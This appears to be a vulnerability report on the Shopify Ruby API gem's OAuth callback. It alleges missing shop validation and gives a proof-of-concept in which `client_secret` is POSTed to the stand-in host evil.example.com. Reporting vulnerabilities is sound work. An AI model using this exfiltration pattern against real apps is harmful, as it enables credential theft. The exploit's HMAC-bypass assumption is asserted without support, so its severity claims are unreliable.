### Title
Missing shop-domain validation in OAuth callback leaks `client_secret` to attacker-controlled host - (File: `lib/shopify_api/auth/oauth.rb`)

### Summary
`ShopifyAPI::Auth::Oauth.validate_auth_callback` builds the access-token exchange request URL directly from `auth_query.shop` without ever passing it through `Utils::ShopValidator.sanitize!`, unlike every other credential-issuing code path in the gem (`ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`, `TokenExchange.migrate_to_expiring_token`). Because `HttpClient#initialize` derives the request host directly from `session.shop` (`@base_uri = "https://#{api_host || session.shop}"`), an unvalidated `shop` value causes the app's `client_id`/`client_secret` to be POSTed to whatever host is present in `shop`.

### Finding Description
`validate_auth_callback` validates the HMAC over the callback's query fields (`code`, `host`, `shop`, `state`, `timestamp`) via `Utils::HmacValidator.validate(auth_query)`, and separately checks the `state` cookie. Neither check constrains `shop` to a trusted Shopify domain — the HMAC only proves the query bytes weren't tampered with in transit, not that `shop` is `*.myshopify.com`. [1](#0-0) 

It then constructs `null_session = Auth::Session.new(shop: auth_query.shop)` and passes it into `Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")`, which resolves the request host as `"https://#{session.shop}"` in `HttpClient#initialize`, and POSTs a body containing `client_secret: Context.api_secret_key` to `#{base_uri}/admin/oauth/access_token`. [4](#0-3) 

Every sibling flow that issues or exchanges credentials sanitizes the shop value first:
- `ClientCredentials.client_credentials` — `validated_shop = Utils::ShopValidator.sanitize!(shop)` before building `shop_session`.
- `RefreshToken.refresh_access_token` — same pattern.
- `TokenExchange.migrate_to_expiring_token` — same pattern.
- `TokenExchange.exchange_token` derives `dest_shop` from a cryptographically-verified JWT `dest` claim (`Auth::JwtPayload`), which is a different but equally strong binding.

`validate_auth_callback` is the only client-secret-bearing flow that binds the outbound host to a raw request parameter without validating it is a Shopify-controlled domain. The binding that should hold — "host receiving `client_secret`" == "a `ShopValidator`-trusted Shopify domain" — is broken here.

### Impact Explanation
If any part of the host application forwards a `shop` query parameter that isn't independently constrained to `*.myshopify.com` before calling `validate_auth_callback` (e.g., a Rack/Rails app that builds `AuthQuery.new(request.parameters...)` directly from callback params, as shown in this gem's own `docs/usage/oauth.md` example), an attacker who can get a victim to hit the callback URL with a manipulated `shop=attacker-controlled-host` parameter (and a `code`/`state` that pass the app's own checks, since `state` is compared against the app's own cookie, not Shopify's) can cause the gem to POST the app's `client_id` and `client_secret` to a server the attacker controls. Leaking `client_secret` is a Critical-severity credential exfiltration: it allows the attacker to impersonate the app in all future OAuth/token-exchange/client-credentials flows against real merchants.

### Likelihood Explanation
The HMAC check does authenticate that `code`/`state`/`shop`/`timestamp` weren't altered in transit relative to whatever `hmac` was supplied — but `hmac` itself is only meaningful if it was generated by Shopify for the exact `shop` in the query. Nothing in this code re-derives or independently confirms that the resulting `shop` domain is one of Shopify's trusted domains before sending secrets to it, in contrast to the explicit, consistently-applied pattern in the three sibling methods, indicating this is an overlooked gap rather than an accepted design tradeoff.

### Recommendation
In `validate_auth_callback`, call `Utils::ShopValidator.sanitize!(auth_query.shop)` (mirroring `ClientCredentials.client_credentials` and `RefreshToken.refresh_access_token`) and use the validated/sanitized shop value when constructing `null_session` and the final `Session.from(shop: ...)`, rejecting the callback before any request carrying `client_secret` is made if the shop domain is untrusted.

### Proof of Concept
1. App exposes a callback endpoint that builds `ShopifyAPI::Auth::Oauth::AuthQuery.new(request.parameters...)` from raw query params (per the pattern documented in `docs/usage/oauth.md`).
2. Attacker crafts a callback URL where `shop=evil.example.com`, with `code`, `state` matching the victim's session cookie/state (achievable via a forced-OAuth-completion/CSRF-style flow where the attacker initiates their own OAuth `begin_auth` and lures the victim into completing it, or via any request path where `hmac` validation only binds fields to each other, not to a trusted domain).
3. `Utils::HmacValidator.validate(auth_query)` passes because the query internally is self-consistent under the HMAC.
4. `validate_auth_callback` builds `Auth::Session.new(shop: "evil.example.com")` and issues `POST https://evil.example.com/admin/oauth/access_token` with `client_id` and `client_secret: Context.api_secret_key` in the body — leaking the app's `client_secret` to the attacker's server.

        def validate_auth_callback(cookies:, auth_query:)
          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = cookies[SessionCookie::SESSION_COOKIE_NAME]
          raise Errors::NoSessionCookieError unless state

          raise Errors::InvalidOauthError,
            "Invalid state in OAuth callback." unless state == auth_query.state

          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )
          rescue ShopifyAPI::Errors::HttpResponseError => e
            raise Errors::RequestAccessTokenError,
              "Cannot complete OAuth process. Received a #{e.code} error while requesting access token."
          end
